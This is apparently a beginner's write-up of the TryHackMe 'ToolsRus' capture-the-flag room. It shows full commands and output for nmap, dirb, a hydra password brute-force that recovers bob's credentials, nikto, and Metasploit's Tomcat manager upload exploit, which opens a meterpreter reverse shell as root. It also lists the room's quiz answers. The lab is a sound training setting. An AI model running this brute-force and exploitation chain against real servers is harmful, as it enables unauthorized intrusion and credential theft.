<p align="center">
  THM : ToolsRus<br>
  Difficulty : Easy<br>
  <img src="https://i.imgur.com/sg6g6sK.png">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Web enumeration](#web-enumeration)
- [Brute-forcing protected directory](#brute-forcing-protected-directory)
- [Nikto scan](#nikto-scan)
- [Exploitation with MSF](#exploitation-with-msf)
- [Conclusion](#conclusion)

## Nmap scan

First, let's do a port scan with [nmap](https://nmap.org/docs.html) : 
```
┌──(attacker㉿AttackBox)-[~/Bureau/CTF/ToolsRus]
└─$ sudo nmap 10.10.84.217 -sS -sV -O -oN nmapResults.txt
[sudo] Mot de passe de attacker : 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 19:46 CEST
Nmap scan report for 10.10.84.217
Host is up (0.031s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/24%OT=22%CT=1%CU=31089%PV=Y%DS=2%DC=I%G=Y%TM=632F428
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
```

There is 2 interesting ports :
- port 80 <- Apache web server, we will enumerate it later
- port 1234 <- Apache Tomcat, maybe has some known vulnerabilities, we will see later

**Question : What other port that serves a webs service is open on the machine ?**  
**Answer : 1234**  

**Question : What is the server version (run the scan against port 80) ?**  
**Answer : Apache/2.4.18**  

**Question : What version of Apache-Coyote is this service using ?**  
**Answer : 1.1**

## Web enumeration

### Summary

- [Dirb scan](#dirb-scan)
- [Manual enumeration](#manual-enumeration)

### Dirb scan

Let's do a simple dirb scan on the website on port 80 of the target :  
```
┌──(attacker㉿AttackBox)-[~/Bureau/CTF/ToolsRus]
└─$ dirb http://10.10.84.217/ /home/attacker/Documents/Outils/SecLists/Discovery/Web-Content/big.txt -o dirbResults.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirbResults.txt
START_TIME: Sat Sep 24 19:45:11 2022
URL_BASE: http://10.10.84.217/
WORDLIST_FILES: /home/attacker/Documents/Outils/SecLists/Discovery/Web-Content/big.txt

-----------------

GENERATED WORDS: 20465                                                         

---- Scanning URL: http://10.10.84.217/ ----
==> DIRECTORY: http://10.10.84.217/guidelines/                                                        
+ http://10.10.84.217/protected (CODE:401|SIZE:459)                                                   
+ http://10.10.84.217/server-status (CODE:403|SIZE:300)                                               
                                                                                                      
---- Entering directory: http://10.10.84.217/guidelines/ ----
                                                                                                      
-----------------
END_TIME: Sat Sep 24 20:07:17 2022
DOWNLOADED: 40930 - FOUND: 2
```

**Question : What directory can you find, that begins with a "g" ?**  
**Answer : guidelines**  

Going to the guidelines directory, we get this page :  
![](https://i.imgur.com/JPUmT5t.png)  

We have now a probable username `bob`. And he has probably access to the Tomcat server on port 1234 according to the message at /protected.
**Question : Whose name can you find from this directory ?**  
**Answer : bob**  

**Question : What directory has basic authentication ?**  
**Answer : protected**  

### Manual enumeration
Let's take a look at port 1234 using a web browser :  
![](https://i.imgur.com/XkHj2iC.png)  

We know that the Apache Tomcat version installed on the target is 7.0.88.  
**Question : Going to the service running on that port, what is the name and version of the software ? Answer format: Full_name_of_service/Version**  
**Answer : Apache Tomcat/7.0.88**

## Brute-forcing protected directory

We already have a username to use. We just need to find a password. Let's try to brute force the basic
authentication at /protected using [hydra](https://github.com/vanhauser-thc/thc-hydra) with rockyou.txt.
```
┌──(attacker㉿AttackBox)-[~/Bureau/CTF/ToolsRus]
└─$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.84.217 http-get /protected
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-24 19:59:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.84.217:80/protected
[80][http-get] host: 10.10.84.217   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-24 19:59:02
```

We successfuly brute-forced the basic authentification ! Now we have credentials that may be used 
somewhere else.

**Question : What is bob's password to the protected part of the website ?**  
**Answer : bubbles**

## Nikto scan

It is asked to use [Nikto](https://github.com/sullo/nikto) to scan the /manager/html directory on port 1234.
```
┌──(attacker㉿AttackBox)-[~/Bureau/CTF/ToolsRus]
└─$ nikto -host http://10.10.84.217:1234/manager/html -id bob:bubbles
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.84.217
+ Target Hostname:    10.10.84.217
+ Target Port:        1234
+ Start Time:         2022-09-24 20:16:05 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ All CGI directories 'found', use '-C none' to test none
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /manager/html/cgi.cgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi.cgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi.cgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...                                  
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.                     
+ OSVDB-3233: /manager/html/jk-manager/manager-howto.html: Tomcat documentation found.                  
+ OSVDB-3233: /manager/html/jk-status/manager-howto.html: Tomcat documentation found.                   
+ OSVDB-3233: /manager/html/admin/manager-howto.html: Tomcat documentation found.                       
+ OSVDB-3233: /manager/html/host-manager/manager-howto.html: Tomcat documentation found.                
+ /manager/html/manager/html: Default Tomcat Manager / Host Manager interface found                     
+ /manager/html/jk-manager/html: Default Tomcat Manager / Host Manager interface found                  
+ /manager/html/jk-status/html: Default Tomcat Manager / Host Manager interface found                   
+ /manager/html/admin/html: Default Tomcat Manager / Host Manager interface found                       
+ /manager/html/host-manager/html: Default Tomcat Manager / Host Manager interface found                
+ /manager/html/httpd.conf: Apache httpd.conf configuration file                                        
+ /manager/html/httpd.conf.bak: Apache httpd.conf configuration file                                    
+ /manager/html/manager/status: Default Tomcat Server Status interface found                            
+ /manager/html/jk-manager/status: Default Tomcat Server Status interface found                         
+ /manager/html/jk-status/status: Default Tomcat Server Status interface found                          
+ /manager/html/admin/status: Default Tomcat Server Status interface found                              
+ /manager/html/host-manager/status: Default Tomcat Server Status interface found                       
+ 26522 requests: 0 error(s) and 94 item(s) reported on remote host                                     
+ End Time:           2022-09-24 20:33:57 (GMT2) (1072 seconds)                                         
---------------------------------------------------------------------------                             
+ 1 host(s) tested 
```
**Question : How many documentation files did Nikto identify ?**  
**Answer : 5**

## Exploitation with MSF

First, let's use `msfconsole` to start the [Metasploit Framework](https://docs.metasploit.com/) console. We know the target is using 
Apache Tomcat 7.0.88. By doing a quick search, we see that the latest release of Tomcat is 10.0.23 
(When I'm writing this). So there is a good chance that the version installed on the target contains
vulnerabilities. Let's search exploits for Apache Tomcat using `search Tomcat type:exploit` :  
```
msf6 > search Tomcat type:exploit

Matching Modules
================

   #   Name                                                            Disclosure Date  Rank       Check  Description
   -   ----                                                            ---------------  ----       -----  -----------
   0   exploit/multi/http/struts_dev_mode                              2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   1   exploit/multi/http/struts2_namespace_ognl                       2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   2   exploit/multi/http/struts_code_exec_classloader                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   3   exploit/windows/http/tomcat_cgi_cmdlineargs                     2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   4   exploit/multi/http/tomcat_mgr_deploy                            2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   5   exploit/multi/http/tomcat_mgr_upload                            2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   6   exploit/multi/http/atlassian_confluence_webwork_ognl_injection  2021-08-25       excellent  Yes    Atlassian Confluence WebWork OGNL Injection
   7   exploit/windows/http/cayin_xpost_sql_rce                        2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   8   exploit/multi/http/cisco_dcnm_upload_2019                       2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   9   exploit/linux/http/cisco_hyperflex_hx_data_platform_cmd_exec    2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform Command Execution
   10  exploit/linux/http/cisco_hyperflex_file_upload_rce              2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
   11  exploit/linux/http/cpi_tararchive_upload                        2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   12  exploit/linux/http/cisco_prime_inf_rce                          2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   13  exploit/linux/http/lucee_admin_imgprocess_file_write            2021-01-15       excellent  Yes    Lucee Administrator imgProcess.cfm Arbitrary File Write
   14  exploit/linux/http/mobileiron_core_log4shell                    2021-12-12       excellent  Yes    MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)
   15  exploit/multi/http/zenworks_configuration_management_upload     2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   16  exploit/multi/http/spring_framework_rce_spring4shell            2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)
   17  exploit/multi/http/tomcat_jsp_upload_bypass                     2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass


Interact with a module by name or index. For example info 17, use 17 or use exploit/multi/http/tomcat_jsp_upload_bypass
```

If we look at index 5 here, we see an exploit to upload file and get a remote code execution on 
the target. Let's get more informations about this exploit using `info 5` :  
```
msf6 > info 5

       Name: Apache Tomcat Manager Authenticated Upload Code Execution
     Module: exploit/multi/http/tomcat_mgr_upload
   Platform: Java, Linux, Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2009-11-09

Provided by:
  rangercha

Available targets:
  Id  Name
  --  ----
  0   Java Universal
  1   Windows Universal
  2   Linux x86

Check supported:
  Yes

Basic options:
  Name          Current Setting  Required  Description
  ----          ---------------  --------  -----------
  HttpPassword                   no        The password for the specified username
  HttpUsername                   no        The username to authenticate as
  Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...
                                           ]
  RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploi
                                           t-framework/wiki/Using-Metasploit
  RPORT         80               yes       The target port (TCP)
  SSL           false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy
                                            will be used)
  VHOST                          no        HTTP server virtual host

Payload information:

Description:
  This module can be used to execute a payload on Apache Tomcat 
  servers that have an exposed "manager" application. The payload is 
  uploaded as a WAR archive containing a jsp application using a POST 
  request against the /manager/html/upload component. NOTE: The 
  compatible payload sets vary based on the selected target. For 
  example, you must select the Windows target to use native Windows 
  payloads.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2009-3843
  OSVDB (60317)
  https://nvd.nist.gov/vuln/detail/CVE-2009-4189
  OSVDB (60670)
  https://nvd.nist.gov/vuln/detail/CVE-2009-4188
  http://www.securityfocus.com/bid/38084
  https://nvd.nist.gov/vuln/detail/CVE-2010-0557
  http://www-01.ibm.com/support/docview.wss?uid=swg21419179
  https://nvd.nist.gov/vuln/detail/CVE-2010-4094
  http://www.zerodayinitiative.com/advisories/ZDI-10-214
  https://nvd.nist.gov/vuln/detail/CVE-2009-3548
  OSVDB (60176)
  http://www.securityfocus.com/bid/36954
  http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html
```

Let's check if there is a manager app on the target. Going to http://\[TARGET_IP\]:1234/manager, 
we get this page :  
![](https://i.imgur.com/NTZ68W4.png)  

So we have a manager app present on the webserver on port 1234 where we can upload files, we now know we can use this exploit 
(We could've done this manually but it is asked to use metasploit).

To use this exploit, we need to type `use 5` or `use exploit/multi/http/tomcat_mgr_upload`
Now, let's see the options used by the exploit with `options` :  
```
msf6 exploit(multi/http/tomcat_mgr_upload) > options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][..
                                            .]
   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasplo
                                            it-framework/wiki/Using-Metasploit
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeplo
                                            y will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.11     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal
```

Here are the options we need to set : 
```
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.84.217
RHOSTS => 10.10.84.217
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST tun0
LHOST => tun0
```

Now we can run the exploit with `run` :  
```
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on HIDDEN:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying uNRL0n7gt3WldJZQkd7fGUnD4O0gQx...
[*] Executing uNRL0n7gt3WldJZQkd7fGUnD4O0gQx...
[*] Undeploying uNRL0n7gt3WldJZQkd7fGUnD4O0gQx ...
[*] Sending stage (58829 bytes) to 10.10.84.217
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (HIDDEN:4444 -> 10.10.84.217:59436) at 2022-09-24 22:17:06 +0200

meterpreter >
```

And we have a meterpreter shell on the target ! Let's see who we are on the machine using `getuid` :  
```
meterpreter > getuid
Server username: root
```
**Question : What user did you get a shell as ?**  
**Answer : root**  

And we are already root. So now we have full control on the target machine. Let's get the root flag :  
```
meterpreter > cd /root
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100667/rw-rw-rwx  47    fil   2019-03-11 17:06:14 +0100  .bash_history
100667/rw-rw-rwx  3106  fil   2015-10-22 19:15:21 +0200  .bashrc
040777/rwxrwxrwx  4096  dir   2019-03-11 16:30:33 +0100  .nano
100667/rw-rw-rwx  148   fil   2015-08-17 17:30:33 +0200  .profile
040777/rwxrwxrwx  4096  dir   2019-03-10 22:52:32 +0100  .ssh
100667/rw-rw-rwx  658   fil   2019-03-11 17:05:22 +0100  .viminfo
100666/rw-rw-rw-  33    fil   2019-03-11 17:05:22 +0100  flag.txt
040776/rwxrwxrw-  4096  dir   2019-03-10 22:52:43 +0100  snap

meterpreter > cat flag.txt
***************************
```
**Question : What text is in the file /root/flag.txt**  
**Answer : \*\*\*\*\*\*\*\*\*\*\*\***

And we are done !

## Conclusion

This room was easy but very useful for begineers like me to train with tools like dirbuster, hydra, nikto... Obviously, it is not recommended to run the web server as root. It's more easy 
for attackers to gain full control of the machine if they find a way to get a shell on it. And it is important to have strong passwords. The password of bob user is too weak and is easy to brute force with rockyou.txt.
Thanks for this room and for reading my write up !
